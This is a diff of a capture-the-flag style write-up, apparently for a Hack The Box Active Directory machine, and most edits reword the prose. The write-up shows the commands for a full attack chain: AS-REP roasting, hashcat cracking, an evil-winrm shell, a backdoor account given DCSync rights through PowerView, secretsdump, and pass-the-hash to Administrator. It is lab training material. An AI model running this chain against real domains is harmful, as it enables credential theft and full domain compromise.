@@ -13,10 +13,9 @@
 The assessment followed a standard attack methodology:
 
 1. Enumeration
-2. Vulnerability Identification
-3. Initial Access
-4. Privilege Escalation
-5. Post Exploitation
+2. Initial Access
+3. Privilege Escalation
+4. Post Exploitation
 ---
 
 ## Enumeration
@@ -48,12 +47,12 @@ PORT      STATE SERVICE      VERSION
 ...
 ```
 Key Findings:
-- Accessible ports DNS (53), Kerberos (88), and LDAP (389) reveal the target machine is Active Directory Domain Controller
+- Accessible ports DNS (53), Kerberos (88), and LDAP (389) indicate the target is an Active Directory Domain Controller
 - Port 445 (SMB) is exposed
 - Port 5985 (WinRM) is exposed
 
 
-Further enumeration was performed by utilizing the tool `enum4linux` to discover any potential shares or users. 
+Further enumeration was performed using `enum4linux` to identify accessible SMB shares and enumerate domain users. 
 ```
 enum4linux 10.129.95.210
 ```
@@ -69,7 +68,7 @@ impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users
 
 ## Initial Access
 
-I was able to successfully obtain the hashed password for the `svc-alfresco` user. Now this hash can be saved locally and taken offline for password cracking using the tool `Hashcat`
+I was able to successfully obtain the hashed password for the `svc-alfresco` user. The recovered hash was saved locally and taken offline and cracked using `Hashcat`
 ```
 hashcat -m 18200 alfresco.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -83,7 +82,7 @@ netexec winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 
 ![verify](Images/verify.png)
 
-Following successful authentication as the `svc-alfresco` account, `evil-winrm` was used to obtain an interactive shell and obtain the first flag
+Following successful authentication as the `svc-alfresco` account, `evil-winrm` was used to obtain an interactive shell on the target
 ```
 evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
 ```
@@ -92,14 +91,14 @@ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
 
 ## Privilege Escalation
 
-Now that intial access has been obtained, user privileges were enumerated to discover any potential security misconfigurations. In this case the user `svc-alfresco` is a member of th Account Operators group, a highly privileged group that can be exploited to further abuse group and user privileges ultimately leading to Domain compromise.  
+Now that intial access has been obtained, the privileges assigned to `svc-alfresco` were examined to identify potential privilege escalation paths. In this case the user is a member of the `Account Operators` group, a highly privileged group that can be exploited to further abuse group and user privileges ultimately leading to Domain compromise.  
 
 
 This can be achieved because `Account Operators` can modify user objects for any user that is not a member of one of the protected groups: Administrators, Domain Admins and Enterprise Admins
 
 ![privs](Images/privs.png)
 
-`Bloodhound`, a powerfull enumeration tool, can be utilised to map the attack path
+`Bloodhound`was used to visualise and idenitfy Active Directory escalation paths. 
 
 ### BloodHound
 
@@ -114,10 +113,16 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\D
 The following attack path has been discovered:
 
 
-svc-alfresco -> Account Operators (member of) -> Account Operators has generic all permissions to Exchange Windows Permissions -> Exchange Windows Permissions has WriteDacl permissions to HTB.LOCAL
+svc-alfresco
+    ↓ MemberOf
+Account Operators
+    ↓ GenericAll
+Exchange Windows Permissions
+    ↓ WriteDACL
+HTB.LOCAL
 
 
-A backdoor account was created and `PowerView` was used to grant DCSync rights. This added the required replication permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) to allow credential extraction from the domain controller.
+A new domain user (`Backdoor`) was created and added to the `Exchange Windows Permissions` group. Since this group has `WriteDACL` permissions over the domain object, the account was able to modify the domain ACL. `PowerView` was then used to grant the account the replication permissions (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) required to perform a DCSync attack and retrieve credentials from the domain controller.
 ```
 $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
 
@@ -128,7 +133,7 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Princip
 
 ![dcsync](Images/dcsync.png)
 
-Finally, the `impacket-secretsdump` tool was executed to retrieve the domain hashes and the `pass-the-hash` technique was used to bypass authentication methods and obtain a privileged shell as the Administrator.
+Finally, the `impacket-secretsdump` tool was executed to retrieve the NTLM hash of the `Administrator` account and the `pass-the-hash` technique was used to bypass authentication methods and obtain a privileged shell as the Administrator.
 ```
 impacket-secretsdump -just-dc-user Administrator htb/Backdoor:"Password1"@10.129.95.210
 ```
